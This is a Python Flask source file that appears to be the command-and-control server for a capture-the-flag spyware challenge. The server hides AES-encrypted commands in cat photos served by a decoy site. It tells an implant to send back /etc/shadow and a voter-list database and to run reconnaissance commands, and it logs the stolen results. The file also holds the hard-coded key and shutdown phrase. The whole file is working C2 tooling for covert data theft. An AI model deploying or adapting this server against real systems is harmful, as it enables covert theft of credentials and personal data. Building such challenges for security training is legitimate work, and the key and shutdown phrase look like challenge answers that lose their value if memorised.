#!/usr/bin/python3
# -*- coding: utf8 -*-
#
# CyberSci Regionals 2024/25
#
# Spyware challenge C2 Server by 0xd13a

from flask import Flask, render_template, request, abort
import base64
import random
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
import binascii
import traceback

# Command to issue to implant
COMMAND_NONE = "\x00"
COMMAND_GET  = "\x01"
COMMAND_EXEC = "\x02"
COMMAND_QUIT = "\x03"

# Requests implant sends
REQUEST_CHECK   = 0
REQUEST_FILE    = 1
REQUEST_COMMAND = 2

# Files to request
files = [
    "/etc/shadow",
    "voter-list.db"
]

# Commands to execute
commands = [
    "ls /",
    "ls /etc",
    "id",
    "ip addr"
]

# Shutdown command payload
SHUTDOWN_COMMAND = "h45tA 1a V15tA, 8aBy!"

# Set up port to communicate on
server_port = 0xCA75

image_num = 16

app = Flask(__name__, template_folder=".")
app.config['MAX_CONTENT_LENGTH'] = 16 * 1000 * 1000

# Encryption key for communications
enc_key = "¡Patria o Muerte!"

# Actual ecryption key to use in AES
key = hashlib.sha256(enc_key.encode()).digest()

# Messages to display on site
messages = [
    "Wow, what a cutie!",
    "Meeow-mazing!",
    "I'm cat-egorically impressed!",
    "I think I'm in love!",
    "That’s one photogenic cat! Those eyes could melt even the coldest heart.",
    "Is it just me, or does this kitty look like royalty? Fit for a throne!",
    "This kitty is pure purr-fection!"
]

# Tga that marks encrypted payload
tag = b"\xff\xcc\xaa\x77\x55"

# Load image from file
def load_file(num):
    return open("../images/{}.jpg".format(hex(num)[2:]), "rb").read()

# Select random message
def get_random_message():
    return random.choice(messages)

# load image randomly
def get_random_image():
    return load_file(random.randint(0, image_num-1))

# Pad for encryption
def pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

# UNpad for encryption
def unpad(s):
    return s[:-ord(s[len(s)-1:])]

# Encrypt data
def encrypt(raw):
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(raw.encode())

# Decrypt data
def decrypt(enc):
    iv = enc[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[AES.block_size:]))

# Log diagnostic message
def log(str):
    print(str, flush=True)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template("index_template.html")

    try:
        if 'file' not in request.files:
            log("No file var")
            abort(400)

        uploaded_file = request.files['file']
        data = uploaded_file.read()

        log("Received data of size {}".format(len(data)))

        output_data = get_random_image()

        pos = data.find(tag)
        if pos != -1:
            encrypted = data[pos+len(tag):]
            log("Found encrypted payoad of size {}".format(len(encrypted)))
            decrypted = decrypt(encrypted)
            log("Decrypted payload: {}".format(binascii.hexlify(bytearray(decrypted))))
            
            if len(decrypted) == 0:
                log("Empty payload")
            else:
                if decrypted[0] == REQUEST_CHECK:
                    log("Request check")
                    
                    random_command = random.choice([COMMAND_NONE, COMMAND_GET, COMMAND_EXEC])
                    if random_command == COMMAND_NONE:
                        output_data = output_data + tag + encrypt(COMMAND_NONE)
                    if random_command == COMMAND_GET:
                        file = random.choice(files)
                        log("Requesting file {}".format(file))
                        output_data = output_data + tag + encrypt(COMMAND_GET + file + "\x00")
                    if random_command == COMMAND_EXEC:
                        command = random.choice(commands)
                        log("Requesting command {}".format(command))
                        output_data = output_data + tag + encrypt(COMMAND_EXEC + command + "\x00")

                    # This will never be run
                    if random_command == COMMAND_QUIT:
                        output_data = output_data + tag + encrypt(COMMAND_QUIT + SHUTDOWN_COMMAND + "\x00")

                if decrypted[0] == REQUEST_COMMAND:
                    log("Command result: {}".format(decrypted[1:]))
                    output_data = output_data + tag + encrypt(COMMAND_NONE)
                if decrypted[0] == REQUEST_FILE:
                    log("File content: {}".format(decrypted[1:]))
                    output_data = output_data + tag + encrypt(COMMAND_NONE)
        else:
            log("No payload received")
    except Exception as e:
        log(traceback.format_exc())
        abort(400)

    return render_template("index_template.html", message=get_random_message(), data=base64.b64encode(output_data).decode('utf-8'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=server_port, ssl_context='adhoc')
